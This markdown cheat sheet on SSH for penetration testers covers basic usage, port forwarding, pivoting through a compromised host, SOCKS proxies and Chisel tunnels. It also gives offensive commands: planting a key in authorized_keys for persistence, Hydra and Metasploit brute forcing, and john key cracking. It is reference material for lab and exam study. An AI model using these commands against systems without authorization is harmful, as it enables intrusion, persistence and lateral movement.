# SSH - Secure Shell

* [Basic Usage](#basic-usage)
* [Common Errors](#common-errors)
* [Permanent Access](#permanent-access)
* [Bruteforce](#bruteforce)
* [SSH Key Bruteforcing](#ssh-key-bruteforcing)
* [File Transfers](#file-transfers)
* [Port Forwarding](#port-forwarding)
    * [Local Forward](#local-forward)
    * [Remote Forward](#remote-forward)
* [Pivoting](#pivoting)
    * [Single Port Forward](#pivoting-single-port-forward)
    * [Dynamic SOCKS Proxy](#pivoting-dynamic-socks-proxy)
        * [FoxyProxy and SOCKS](#foxyproxy-and-socks)
        * [Burp and SOCKS](#burp-and-socks)
        * [Proxychains](#proxychains)
    * [Useful SSH Params](#pivoting-useful-ssh-params)
* [Chisel](#chisel)


## Basic Usage

```bash
ssh user@host
ssh host -l user
```

Non-standard port (other than 22):
```bash
ssh -p 1234 user@host
```

Use non-standard (not ~/.ssh) key:

```bash
ssh -i ./id_rsa user@host
ssh -o "IdentitiesOnly=yes" -i <private key filename> <hostname>
```

Execute command right after login:
```bash
ssh bandit.labs.overthewire.org -p 2220 -l bandit18 -t "cat ~/readme"
```

Create RSA key pair:
```bash
ssh-keygen -t rsa -b 4096
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

Start local SSH server:
```bash
sudo systemctl start ssh.socket
```

Stop local SSH server:
```bash
sudo systemctl stop ssh.socket
```

## Common Errors

Use nmap to figure out what key exchange methods and ciphers are supported. But the error usually tells you what is supported by the server.

```bash
sudo nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods $ip
```

Error: **"no matching key exchange method..."**
```bash
ssh user@host -oKexAlgorithms=+<key-exchange>
ssh user@host -oKexAlgorithms=+diffie-hellman-group1-sha1
```

Error: **"no matching cipher..."**
```bash
ssh user@host -c <cipher>
ssh user@host -c aes128-cbc
```

Error: **"key too open"**
```bash
chmod 400 ./id_rsa
```

Using DSS Keys:
```bash
ssh -i ./id_dss -oKexAlgorithms=+diffie-hellman-group1-sha1 user@target

# edit file ~/.ssh/config (those are tabs not spaces)
Host *
    KexAlgorithms +diffie-hellman-group1-sha1
    PubkeyAcceptedKeyTypes +ssh-dss

```

* [Debian OpenSSL Predictable PRNG (CVE-2008-0166)](https://github.com/g0tmi1k/debian-ssh)

## Permanent Access

Append your public key to ~/.ssh/authorized_keys

```bash
echo "<your_pub_key>" >> /home/admin/.ssh/authorized_keys
```

## File Transfers

🠒 See [SSH/SCP in the File Transfers Cheatsheet](./file_transfers.md#sshscp)

## Bruteforce

Metasploit:
```bash
msf5 > use auxiliary/scanner/ssh/ssh_login
set STOP_ON_SUCCESS true
set VERBOSE true
set BLANK_PASSWORDS true
set USER_AS_PASS true
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

Hydra:
```bash
hydra -l alexander -P /usr/share/seclists/Miscellaneous/wordlist-skipfish.fuzz.txt 10.0.0.11 -t 4 ssh
proxychains hydra -l alexander -P /usr/share/seclists/Miscellaneous/wordlist-skipfish.fuzz.txt 10.0.0.11 -t 4 ssh
```

### Username Bruteforce

A noteworthy exploit is **"User enumeration in OpenSSH before version 7.7"** (CVE 2018-15473). 

It allows you to bruteforce usernames that exist on the SSH server relatively easily (EDB 45233). 
The relevant Metasploit module is called `scanner/ssh/ssh_enumusers`.

## SSH Key Bruteforcing

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

## File Transfers

```bash
scp <source> <destination>
scp SourceFile user@host:directory/TargetFile
```

## Port Forwarding

Useful SSH Params for Port Forwarding:

```bash
-L  #-- local forward
-R  #-- remote forward
-N  #-- don't open a shell
-C  #-- compress connection (save bandwidth)
-q  #-- quiet mode (don't print anything locally)
-f  #-- fork to background process (you will need to use: kill <pid> to close the tunnel)
-X  #-- set SOCKS version 4 / 5 (default is 5)
```

### Local Forward
```bash
# Local port forward
# Syntax
ssh -L <local-host>:<local-port>:<target-host>:<target-port> <user@target>

# Syntax (short-hand, omit local host)
ssh -L <local-port>:<target-host>:<target-port> <user@target>
```

* **Open a listening port on your own local machine** (where you are running the ssh command)
* Traffic to that local port gets relayed to a remote host:port socket via SSH tunnel
* The (local) SSH **Client** is in charge of opening the local port

Example (Kali is your local machine):

```bash
# Scenario: No access from Kali to 10.1.1.99:3306

⎡  Kali (you) ⎤             ⎡     TARGET     ⎤
⎜  10.1.1.42  ⎟ === LAN === ⎜    10.1.1.99   ⎟
⎜             ⎟             ⎜ Open: 22 (SSH) ⎟
⎣             ⎦             ⎣ Filtered: 3306 ⎦  
```

In this scenario you have SSH access to the TARGET host with the IP address `10.1.1.99`. 

The TARGET machine has a firewall that blocks remote access to the 3306 port (the MySQL database running on TARGET). But you very much want to get access to it, so you can enumerate it properly.

Therefore you want to forward that filtered MySQL port 3306 on TARGET to your own machine so you can interact with it more easily:

```bash
# Example 1
# open port 1337 on your own machine (localhost on Kali)
# traffic gets relayed to 127.0.0.1:3306 (localhost on TARGET) by the SSH server
ssh -L 127.0.0.1:1337:127.0.0.1:3306 user@10.1.1.99

# Example 2
# open port 1337 on your own machine (localhost on Kali)
# traffic gets relayed to 10.1.1.99:3306 (TARGET) by the SSH server
ssh -L 127.0.0.1:1337:10.1.1.99:3306 user@10.1.1.99
```

This will open the port 1337 on Kali's localhost (127.0.0.1:1337). When you interact with socket `127.0.0.1:1337` on Kali, then the connection will be automatically relayed to `10.1.1.99:3306` or `127.0.0.1:3306` on the target (as seen from the perspective of the SSH server on TARGET.

Example 1 and 2 are almost identical in behavior since from the viewpoint of the SSH server `127.0.0.1` (localhost) and `10.1.1.99` (network address) are both its own IP addresses. But sometimes applications have access control restrictions and will block any traffic that is not originating from localhost and/or directed to localhost (`127.0.0.1 <-> 127.0.0.1`). So most of the time Example 1 would be the preferred version when the target socket is on the same machine as the SSH server.

Either way the result will look like this:

```bash
# Scenario: Access to 10.1.1.99:3306 through 1337 on Kali

⎡  Kali (you) ⎤               ⎡     TARGET     ⎤
⎜  10.1.1.42  ⎟ ==== LAN ==== ⎜    10.1.1.99   ⎟
⎜             ⎟               ⎜ Open: 22 (SSH) ⎟
⎣ Open: 1337  ⎦ <–––tunnel––> ⎣ Filtered: 3306 ⎦  
```

Effectively it will look to you as if the MySQL database was running on your own machine on port 1337.

Now you can interact with the MySQL server in a terminal on Kali:

```bash
mysql -u root -p -h 127.0.0.1 -P 1337
```

### Access control on forwarded port

Since you almost always just want to use `127.0.0.1` (localhost) as the `<local-host>` parameter, there is a shorthand syntax:

```bash
# short-hand version for local forward limited to localhost (omit local host IP)
# Syntax
ssh -L <local-port>:<target-host>:<target-port> <user@target>

# Example
ssh -L 1337:127.0.0.1:3306 user@10.1.1.99
```
This just omits the `<local-host>` parameter and implies that you want to use `127.0.0.1`.

If you write `127.0.0.1` as `<local-host>`, then you will only be able to access the locally opened socket from `127.0.0.1`. The same is true for the shorthand version above. 

But there is a reason why you can supply the `<local-host>` parameter in the first place. You can also bind the socket you open to other listening addresses than localhost.

If you wish to open the local port 1337 globally (to the entire network, available on all interfaces), then use the wildcard `0.0.0.0`:

```bash
# Local port forward. Listen for all local IP addresses (wildcard)
# Syntax
ssh -L 0.0.0.0:<local-port>:<target-host>:<target-port> <user@target>

# Example
ssh -L 0.0.0.0:1337:127.0.0.1:3306 user@10.1.1.99
```

This also has a shorthand version:

```bash
# short-hand version for local forward open to the local network (omit local host IP, but not the colon)
# Syntax
ssh -L :<local-port>:<target-host>:<target-port> <user@target>

# Example
ssh -L :1337:127.0.0.1:3306 user@10.1.1.99
```

Notice the colon (`:`) left of the local port.

But you can also listen on a specific IP address. Let's say you have a network interface with the IP Address `10.1.1.42`. Then you could do:

```bash
# only listen for connections to specific ip address
ssh -L 10.1.1.42:1337:127.0.0.1:3306 user@10.1.1.99
```

### Remote Forward

The process can also be done in reverse, opening a port on the TARGET which forwards to one of your local ports.

```bash
# Remote forward. Open port on TARGET loopback interface.
# Syntax
ssh -R <target-port>:<forward-to-host>:<forward-to-port> user@target
```

* **Open a listening port on a remote machine**
* Traffic to that remote host:port socket gets **relayed to some port on your own (local) machine**
* The **SSH Server** is in charge of opening the remote port

Example (you are Kali). Initially the setup looks like this:

```bash
⎡  Kali (you) ⎤                ⎡     TARGET     ⎤
⎜  10.1.1.42  ⎟  ==== LAN ==== ⎜    10.1.1.99   ⎟
⎜             ⎟                ⎜ Open: 22 (SSH) ⎟
⎣ Open:   80  ⎦                ⎣                ⎦                            
```

In this scenario there is an HTTP server running on your own machine (Kali) on port 80. You wish to open a port on TARGET which forwards to your HTTP server.

On Kali you would run:
```bash
# Remote forward. Open port on TARGET loopback interface.
# Syntax
ssh -R <target-port>:<forward-to-host>:<forward-to-port> user@target

# Example
ssh -R 127.0.0.1:10080:127.0.0.1:80 user@target

# Example (shorthand syntax)
ssh -R 10080:127.0.0.1:80 user@target
```
```bash
# Optionally make the port on target globally accessible (GatewayPorts yes)
ssh -R 0.0.0.0:10080:127.0.0.1:80 user@target
```

The result would look like this:

```bash
⎡ Kali (you) ⎤               ⎡      TARGET    ⎤
⎜  10.1.1.42 ⎟ ==== LAN ==== ⎜    10.1.1.99   ⎟
⎜            ⎟               ⎜ Open: 22 (SSH) ⎟
⎣ Open:   80 ⎦ <––tunnel–––> ⎣ Open:    10080 ⎦                        
```

Wherein traffic directed to port `10080` on TARGET (10.1.1.99) gets forwarded to `10.1.1.42:80`.

Now users on the TARGET can visit `http://127.0.0.1:10080` and they will see the files served by the web server running on `http://10.1.1.42:80` (Kali).

Please note that the remote forward permissions are determined by the SSH config of the TARGET SSH server. Which makes sense since the SSH server must open a listening port on the remote machine in order to create that forward.

If you want to bind the opened port on TARGET globally (wildcard 0.0.0.0), then you will need to set `GatewayPorts yes` in the `/etc/ssh/sshd_config` of the TARGET machine. Changing that config usually requires root access on TARGET.

When bound to 0.0.0.0, then anybody in the nework can visit `http://10.1.1.99:10080` in order to access the web server running on `http://10.1.1.42:80`.

## Pivoting

🠒 See also [Metasploit notes on pivoting](./metasploit.md#pivoting). Which allows you to pivot without SSH.

---

Use a bridge host to reach a remote network. 

This can be rather confusing, so here is a practical example:

- **10.1.1.42 - Kali (you)**
- **10.8.8.77 - TARGET**

In this scenario you cannot reach the **TARGET** host because the router firewall will block it or there is no route to the 10.8.8.0/24 network.

```bash
# Communication impossible between Kali and TARGET (no route)

⎡   Kali    ⎤                          ⎡   TARGET  ⎤
⎜ 10.1.1.42 ⎟ ========== X|X --------- ⎜ 10.8.8.77 ⎟
⎜           ⎟                          ⎜           ⎟
⎣           ⎦                          ⎣ Port:  80 ⎦
```

Now assume you compromised a host that is able to reach the target:

* **10.1.1.33 - BRIDGE**

You have ssh access on the **BRIDGE** host with username pippin, i.e. you could do `ssh pippin@10.1.1.33` from **Kali** to get a shell on BRIDGE.

Now you can use **BRIDGE** to access **TARGET** via port forwarding:

```bash
# SSH server on Bridge acts as a middleman between Kali and TARGET

⎡    Kali   ⎤       ⎡   BRIDGE  ⎤       ⎡   TARGET  ⎤
⎜ 10.1.1.42 ⎟ ===== ⎜ 10.1.1.33 ⎟ ===== ⎜ 10.8.8.77 ⎟
⎜           ⎟       ⎜ Port:  22 ⎟       ⎜           ⎟
⎣           ⎦       ⎣           ⎦       ⎣ Port:  80 ⎦
```

You can either set up a forward to a single port on 10.8.8.77 or you can set up a dynamic Proxy in order to access all of 10.8.8.0/24.

### Pivoting: Single Port Forward

Forward a single port using a bridge host.
```bash
# Syntax
ssh -N -L <localport>:<target>:<targethost> <user@bridge>

# Example
ssh -N -L 8888:10.8.8.77:80 pippin@10.1.1.33
```
```bash
⎡    Kali   ⎤       ⎡   BRIDGE  ⎤       ⎡   TARGET  ⎤
⎜ 10.1.1.42 ⎟ ===== ⎜ 10.1.1.33 ⎟ ===== ⎜ 10.8.8.77 ⎟
⎜           ⎟       ⎜ Port:  22 ⎟       ⎜           ⎟
⎣ Port:8888 ⎦ <–––––⎣–––tunnel––⎦–––––> ⎣ Port:  80 ⎦
```

You execute that SSH command on Kali and it will open listening port 8888 on Kali.

Now you can visit `http://127.0.0.1:8888` in your browser on Kali and your request will be forwarded to the HTTP server on 10.8.8.77:80 by the SSH server on BRIDGE.

The rule of thumb is that if the SSH server on bridge can reach it, then you can forward it.

### Pivoting: Dynamic SOCKS Proxy

🠒 See also [Metasploit notes on SOCKS](./metasploit.md#socks-proxy). Which allows you to set up a dynamic SOCKS proxy without SSH.

---

You can also set up a dynamic proxy with SSH in order to reach every host/port in the target network 10.8.8.0/24 via SOCKS proxy:

```bash
⎡    Kali   ⎤       ⎡   BRIDGE  ⎤       ⎡   network   ⎤
⎜ 10.1.1.42 ⎟ ===== ⎜ 10.1.1.33 ⎟ ====< ⎜ 10.8.8.0/24 ⎟
⎣ Port:1337 ⎦       ⎣ Port:  22 ⎦       ⎣   dynamic   ⎦
```
```bash
# Syntax
ssh -N -D <localport> -q -C -f <user@bridge>

# Example
ssh -N -D 1337 -q -C -f pippin@10.1.1.33
```

Now the SOCKS proxy should be available on `localhost:1337` and give access to the entire 10.8.8.0/24 subnet.

By default SSH will use the SOCKS 5 protocol for dynamic forwards, which supports both TCP and UDP tunneling, but you can also specify a version with `-X 4` which will use SOCKS 4 (only supports TCP).


#### FoxyProxy and SOCKS

The **FoxyProxy** browser plugin allows you to use your SOCKS forward with your browser.

In the FoxyProxy settings create a SOCKS5 profile pointing to your SOCKS proxy at `localhost:1337`. 

Make sure to set the Proxy Type to "SOCKS" and not the default "HTTP".

With that proxy active you can reach any host in the 10.8.8.0/24 network. e.g. `http://10.8.8.222` in your browser.


#### Burp and SOCKS

You can also configure **Burp** to use your SOCKS proxy. In Burp go to tab `User Options` and scroll to the bottom for SOCKS proxy settings. Set hostname and port to match your SOCKS forward.

Once Burp is configured like that, you can use the your regular Burp HTTP FoxyProxy profile in your browser. The connection will go through Burp Proxy first and then through the SOCKS proxy.

A lot of other programs and command line program support SOCKS proxies as well. Check the man pages of tools you need. 


#### Proxychains

For programs that do not support SOCKS proxies, take a look at **proxychains** or **proxychains-ng**. The regular proxychains is available via apt on Kali Linux.

After setting up the SOCKS proxy, edit `/etc/proxychains.conf`:
```bash
# add our SOCKS proxy to /etc/proxychains.conf
socks5 127.0.0.1 1337

# Quiet mode (Optional. Less console spam from proxychains)
quiet_mode
```

Now in a terminal you can run commands through proxychains like so:
```bash
# Nmap scan through proxychains using our SOCKS proxy
# Scanning will be slow, so do not use service detection in a full TCP portscan
proxychains nmap -sT -Pn -p- -T4 -v 10.8.8.47

# Probably required are the options:
# -sT  -- Use TCP connect scan (SYN-scan doesn't work through SOCKS)
# -Pn  -- Disable Ping probe (ICMP doesn't go through SOCKS)
```

Once you have confirmed which ports are open, use focused nmap service scans on the open ports directly.

If you need to use a program that does not work with proxychains or if using proxies is not feasible, then just create a single port forward ([see above](#pivoting-single-port-forward)) to access a single remote service.

Especially **long running scans** or **directory/password bruteforcing** should probably be done via single-port forward, not via dynamic SOCKS proxy. The major benefit of SOCKS is convenience, but not exactly speed.


## Chisel

Chisel creates tunnels without requiring SSH. Meterpreter can do this as well, but if you don't want to use it for some reason, then chisel is your best choice.

* Download (go to Releases): https://github.com/jpillora/chisel

For example, if you wanted to forward a service running on port 8888 on a Windows target machine to your local Kali machine:

Start the server on Kali with the reverse parameter:

```bash
./chisel_64_lin server --port 5555 --reverse
```

On the target start the client:

```powershell
.\chisel_64_win.exe client --max-retry-count 4 --fingerprint <base64_here> 10.10.0.42:5555 R:8888:localhost:8888
```

Here `10.10.0.42:5555` is the chisel server running on Kali. 

Port 8888 should now be open on Kali and allow you to access the service running on port 8888 on the target.


## References

* ssh(1) - Linux man page - https://linux.die.net/man/1/ssh
* SSH Port Forwarding - https://zaiste.net/posts/ssh-port-forwarding/
* OSCP: Understanding SSH Tunnels - https://medium.com/@falconspy/oscp-understanding-ssh-tunnels-519e31c698bf
